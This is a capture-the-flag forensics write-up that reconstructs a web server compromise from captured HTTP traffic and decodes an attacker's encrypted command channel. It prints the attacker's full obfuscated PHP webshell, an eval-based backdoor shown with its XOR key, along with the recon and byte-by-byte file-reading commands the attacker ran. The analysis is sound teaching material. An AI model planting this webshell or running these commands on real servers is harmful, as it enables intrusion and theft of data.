# Web Shell - CTF Writeup

## Challenge Description

> Our web server was compromised again and we aren't really sure what the attacker was doing. Luckily, we only use HTTP and managed to capture network traffic during the attack! Can you figure out what the attacker was up to?

**Provided file:** `160a1a6c3cb6643ad585e2ede50bba3f7fdc5615.zip`

---

## Tools Used

- `tshark` - Network packet analysis
- `Python 3` - Decoding scripts
- `xxd` - Hexadecimal conversion

---

## Step 1: Extraction and Initial Reconnaissance

```bash
unzip 160a1a6c3cb6643ad585e2ede50bba3f7fdc5615.zip
```

Contents: `web_shell.pcap` (5.2 MB)

---

## Step 2: HTTP Traffic Analysis

We identify the most frequent HTTP requests:

```bash
tshark -r web_shell.pcap -Y "http.request" -T fields \
    -e http.request.method -e http.request.uri 2>/dev/null \
    | sort | uniq -c | sort -rn | head -20
```

**Relevant result:**
```
125 POST    /uploads/owned.php
 40 GET     /
  5 GET     /hp/device/this.LCDispatcher
...
```

**Finding:** 125 POST requests to `/uploads/owned.php` - clearly a webshell.

---

## Step 3: Identify the Webshell Upload

We search for the TCP stream where the file was uploaded:

```bash
tshark -r web_shell.pcap -q -z "follow,tcp,ascii,159" 2>/dev/null
```

**Webshell uploaded via `uploader.php`:**

```php
<?php
$d=str_replace('eq','','eqcreaeqteeq_fueqnceqtieqon');
$C='{[Z$o.=$t[Z{$i}^$k{$j};[Z}}return [Z$[Zo;}if (@preg_[Zmatc[Zh("[Z/$[Zkh(.+)$kf[Z/",@file[Z_ge[Z[Zt_conten[Zts("p[Z[Zh';
$q='Z[Z,$k){$c=strlen($k);$l=s[Ztrlen([Z$t);$[Z[Zo="";for[Z($i=0;$i<$[Zl;){for[Z($j=0[Z;($j<[Z[Z$c&&$i<$l[Z[Z);$j[Z++,$i++)';
$O='$k="8[Z1aeb[Ze1[Z8";$kh="775d[Z4[Zf83f4e0";[Z$kf=[Z"0120dd0bcc[Zc6[Z";$p="[ZkkqES1eCI[ZzoxyHXb[Z[Z";functio[Zn x[Z($t[';
$Z='[Zet_conte[Znts()[Z;@ob_end_clean();$r=[Z@b[Zase64_enco[Zde(@x([Z@gzco[Z[Z[Zmpress($o),$k));pri[Znt[Z("$[Zp$kh$r$kf");}';
$V='p://input"),$m)[Z==1) {@ob_[Zst[Zart();@e[Zval(@gzun[Zcom[Zpress(@x[Z(@base[Z64_de[Zc[Zode($m[1])[Z,$k)));$[Zo[Z=@ob_[Zg';
$v=str_replace('[Z','',$O.$q.$C.$V.$Z);
$W=$d('',$v);$W();
?>
```

### Webshell Analysis

The code is obfuscated with `[Z]` as padding. After cleaning it up:

**Encryption parameters:**
- **XOR key:** `81aebe18`
- **Start delimiter:** `775d4f83f4e0` (kh)
- **End delimiter:** `0120dd0bccc6` (kf)
- **Response prefix:** `kkqES1eCIzoxyHXb`

**Communication flow:**
1. Command arrives in POST body encrypted with XOR + gzip + base64
2. The webshell executes the command with `eval()`
3. Response is returned encrypted with the same scheme

---

## Step 4: Extract All Webshell Responses

```bash
for stream in $(seq 160 284); do
  tshark -r web_shell.pcap -q -z "follow,tcp,ascii,$stream" 2>/dev/null \
    | grep -o "kkqES1eCIzoxyHXb775d4f83f4e0[A-Za-z0-9+/=]*0120dd0bccc6"
done > all_responses.txt
```

---

## Step 5: Decoding Script

### `decode.py` - Decode responses

```python
import base64
import zlib

key = b"81aebe18"
kh = "775d4f83f4e0"
kf = "0120dd0bccc6"

def xor_decrypt(data, key):
    result = bytearray()
    for i in range(len(data)):
        result.append(data[i] ^ key[i % len(key)])
    return bytes(result)

def decode_response(resp):
    start = resp.find(kh)
    end = resp.find(kf)
    if start == -1 or end == -1:
        return None
    start += len(kh)
    b64_data = resp[start:end]
    try:
        decoded = base64.b64decode(b64_data)
        xored = xor_decrypt(decoded, key)
        decompressed = zlib.decompress(xored)
        return decompressed.decode('utf-8', errors='replace').strip()
    except:
        return None

with open('all_responses.txt', 'r') as f:
    for i, line in enumerate(f, 1):
        line = line.strip()
        if line:
            result = decode_response(line)
            print(f"[{i}] {result}")
```

**Decoded responses (excerpt):**
```
[3] uid=33(www-data) gid=33(www-data) groups=33(www-data)
[4] index.html
    owned.php
[5] index.html
    uploader.php
    uploads
    y_flag_here.txt
[7] 32
[10] 37
[13] 33
...
```

**Finding:** The attacker found `y_flag_here.txt` and extracted its contents byte by byte.

---

## Step 6: Extract and Decode Commands

```bash
tshark -r web_shell.pcap \
    -Y "http.request.method == POST and http.request.uri contains owned.php" \
    -T fields -e http.file_data 2>/dev/null > all_cmd_hex.txt
```

### Script to Decode Commands

```python
def decode_payload(hex_data):
    raw = bytes.fromhex(hex_data).decode('latin-1')
    start = raw.find(kh)
    end = raw.find(kf)
    if start == -1 or end == -1:
        return None
    start += len(kh)
    b64_data = raw[start:end]
    # Clean non-base64 characters
    b64_clean = ''.join(c for c in b64_data
        if c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=')
    while len(b64_clean) % 4 != 0:
        b64_clean += '='
    try:
        decoded = base64.b64decode(b64_clean)
        xored = xor_decrypt(decoded, key)
        decompressed = zlib.decompress(xored)
        return decompressed.decode('utf-8', errors='replace')
    except:
        return None
```

**Commands executed by the attacker:**
```
[2] chdir('/var/www/html/uploads');@error_reporting(0);@system('id 2>&1');
[3] chdir('/var/www/html/uploads');@error_reporting(0);@system('ls 2>&1');
[4] chdir('/var/www/html/uploads');@error_reporting(0);@system('ls ../ 2>&1');
[7] chdir('/var/www/html/uploads');@error_reporting(0);@system('xxd -p -l1 -s31 ../y_flag_here.txt 2>&1');
[10] chdir('/var/www/html/uploads');@error_reporting(0);@system('xxd -p -l1 -s34 ../y_flag_here.txt 2>&1');
...
```

**Exfiltration technique:** The attacker used `xxd -p -l1 -s<offset>` to read the file **byte by byte in random order**, possibly to evade detection.

---

## Step 7: Reconstruct the Flag

### `reconstruct.py` - Final script

```python
import base64
import zlib
import re

key = b"81aebe18"
kh = "775d4f83f4e0"
kf = "0120dd0bccc6"

def xor_decrypt(data, key):
    result = bytearray()
    for i in range(len(data)):
        result.append(data[i] ^ key[i % len(key)])
    return bytes(result)

def decode_payload(hex_data):
    raw = bytes.fromhex(hex_data).decode('latin-1')
    start = raw.find(kh)
    end = raw.find(kf)
    if start == -1 or end == -1:
        return None
    start += len(kh)
    b64_data = raw[start:end]
    b64_clean = ''.join(c for c in b64_data
        if c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=')
    while len(b64_clean) % 4 != 0:
        b64_clean += '='
    try:
        decoded = base64.b64decode(b64_clean)
        xored = xor_decrypt(decoded, key)
        decompressed = zlib.decompress(xored)
        return decompressed.decode('utf-8', errors='replace')
    except:
        return None

def decode_response(resp):
    start = resp.find(kh)
    end = resp.find(kf)
    if start == -1 or end == -1:
        return None
    start += len(kh)
    b64_data = resp[start:end]
    try:
        decoded = base64.b64decode(b64_data)
        xored = xor_decrypt(decoded, key)
        decompressed = zlib.decompress(xored)
        return decompressed.decode('utf-8', errors='replace').strip()
    except:
        return None

# Load data
with open('all_cmd_hex.txt', 'r') as f:
    commands = [line.strip() for line in f if line.strip()]

with open('all_responses.txt', 'r') as f:
    responses = [line.strip() for line in f if line.strip()]

# Map offset -> hex value
flag_map = {}
for i, cmd_hex in enumerate(commands):
    cmd = decode_payload(cmd_hex)
    if cmd and 'xxd -p -l1 -s' in cmd:
        match = re.search(r'-s(\d+)', cmd)
        if match:
            offset = int(match.group(1))
            resp = decode_response(responses[i])
            if resp and len(resp) == 2:
                flag_map[offset] = resp

# Reconstruct flag in order
max_offset = max(flag_map.keys())
flag_hex = ''.join(flag_map.get(i, '??') for i in range(max_offset + 1))

print(f"Hex: {flag_hex}")
print(f"Flag: {bytes.fromhex(flag_hex).decode()}")
```

**Execution:**
```
$ python3 reconstruct.py
Hex: 3234374354467b35363438356363303761633364306266393762333032326132663937323438637d
Flag: 247CTF{56485cc0XXXXXXXXXXXXXXXX2f97248c}
```

---

## Flag

```
247CTF{56485cc0XXXXXXXXXXXXXXXX2f97248c}
```

---

## Attack Summary

| Phase | Action | Tool/Technique |
|------|--------|----------------|
| 1. Reconnaissance | Web server scanning | Nikto 2.1.5 |
| 2. Exploitation | PHP webshell upload | POST to `/uploader.php` |
| 3. Persistence | XOR+gzip encrypted webshell | `owned.php` in `/uploads/` |
| 4. Discovery | File enumeration | `ls`, `id` |
| 5. Exfiltration | Byte-by-byte reading in random order | `xxd -p -l1 -s<offset>` |

---

## Key Lessons

1. **Upload validation:** Never allow uploading of executable files (.php)
2. **Encryption is not security:** The webshell used XOR, but patterns were detectable
3. **Traffic monitoring:** Network capture allowed full attack reconstruction
4. **Stealthy exfiltration:** Reading files byte by byte in random order makes pattern-based detection harder
